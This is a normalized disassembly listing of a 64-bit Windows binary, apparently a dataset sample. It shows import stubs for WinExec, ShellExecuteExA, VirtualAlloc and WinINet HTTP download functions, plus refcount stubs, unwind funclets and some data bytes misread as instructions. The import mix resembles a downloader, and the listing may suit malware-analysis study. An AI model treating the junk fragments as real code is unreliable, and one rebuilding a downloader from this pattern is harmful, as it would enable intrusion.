jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
GetSystemDirectoryA
jmp [ GetSystemDirectoryA@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetVersionExW
jmp [ GetVersionExW@IAT ]
GetVolumeInformationW
jmp [ GetVolumeInformationW@IAT ]
GetWindowsDirectoryW
jmp [ GetWindowsDirectoryW@IAT ]
Sleep
jmp [ Sleep@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WinExec
jmp [ WinExec@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
sub_40b790
sub rsp 0x28
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
call FreeLibrary
sub_40b7c0
sub rsp 0x28
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
jne r-xdata
add rsp 0x28
retn
call sub_40b740
mov [ rw-data ] 0x0
HttpAddRequestHeadersA
jmp [ HttpAddRequestHeadersA@IAT ]
HttpOpenRequestA
jmp [ HttpOpenRequestA@IAT ]
HttpSendRequestA
jmp [ HttpSendRequestA@IAT ]
InternetConnectA
jmp [ InternetConnectA@IAT ]
InternetOpenA
jmp [ InternetOpenA@IAT ]
InternetReadFile
jmp [ InternetReadFile@IAT ]
sub_40b860
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
retn
sub_40b870
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
sub_40b880
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
retn
sub_40b890
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
sub_40b8a0
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
retn
sub_40b8b0
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
sub_40b8c0
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
retn
sub_40b8d0
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
ShellExecuteExA
jmp [ ShellExecuteExA@IAT ]
sub_40b8f0
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
retn
sub_40b900
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
sub_40c1ba
insd
add al [ gs : rax ]
add [ rax ] al
or [ rax ] eax
cmp al 0xc2
add [ rax ] al
add [ rax ] al
add [ rax + rax - 0xf ] al
[ rsi - 0x3e ]
sub_40c1d0
add [ rax ] al
add [ rax ] al
add [ rax + rax - 0xf ] al
inc esi
retn 0x40
sub_40c1e6
stc
retn 0x40
sub_40c800
sub rsp 0x28
mov rcx [ r-xdata ]
mov dl 0x1
call sub_40c820
mov rcx rax
call sub_40c9e0
add rsp 0x28
retn
sub_40c920
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_40ca60
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x28 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_40ccdf
inc [ rcx ]
add [ rax ] al
add [ 0xffffffffcd0d98e9 ] ch
int3
sub_40cf7f
inc [ rcx ]
add [ rax ] al
add [ rdi ] ch
add [ rax ] al
add ah cl
int3
sub_40e56b
inc [ rcx ]
add [ rax ] al
add [ rax + rax ] dh
add [ rax ] al
int3
sub_410ebb
inc [ rcx ]
add [ rax ] al
add [ rax + rax - 0x34 ] bl
int3
sub_41116b
inc [ rcx ]
add [ rax ] al
add [ rax + rax - 0x34 ] bl
int3
sub_411a0f
inc [ rcx ]
add [ rax ] al
add [ rax + rax ] bl
add ah cl
int3
sub_411ab0
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_411d90
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x98 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412420
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_412530
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_412650
push rbx
sub rsp 0x20
mov rbx rdx
mov rax rbx
mov rdx [ rcx + 0x8 ]
mov r8 [ r-xdata ]
mov rcx rax
call sub_409910
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_412680
mov eax [ rcx + 0x10 ]
retn
sub_412710
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x448 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412a20
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x478 ]
mov rcx rbp
neg rcx
mov rcx [ rax + rcx ]
call InternetCloseHandle
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412a50
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x470 ]
mov rcx rbp
neg rcx
mov rcx [ rax + rcx ]
call InternetCloseHandle
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412a80
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x468 ]
mov rcx rbp
neg rcx
mov rcx [ rax + rcx ]
call InternetCloseHandle
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412ab0
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x4a8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412bc0
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_412c90
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x60 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412cc0
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_412d90
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_412e10
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412fa0
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_412fcb
inc [ rdx ]
add [ rax ] al
add [ rdi ] ch
add [ rdi ] ch
add [ rax ] al
add ah cl
int3
sub_413110
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_4132b0
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_413530
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407810
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_41357f
inc [ rcx ]
add [ rax ] al
add [ rbp ] bl
add [ rax ] al
int3
sub_413f4f
inc [ rcx ]
add [ rax ] al
add [ rax + rax ] ch
add [ rax ] al
int3
sub_414160
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_414197
dec esp
int3
sub_4141a0
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
retn
sub_4141b0
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
sub_4141c0
retn
sub_41764f
push rcx
outsd
jae r-xdata
int3
push rdi
imul ebp [ rsi + 0x61 ] 0x572e6970
imul ebp [ rsi + 0x49 ] 0xcc74656e
int3
sub_4176a3
call sub_4073e0
sub_4176b0
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_4176c0
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
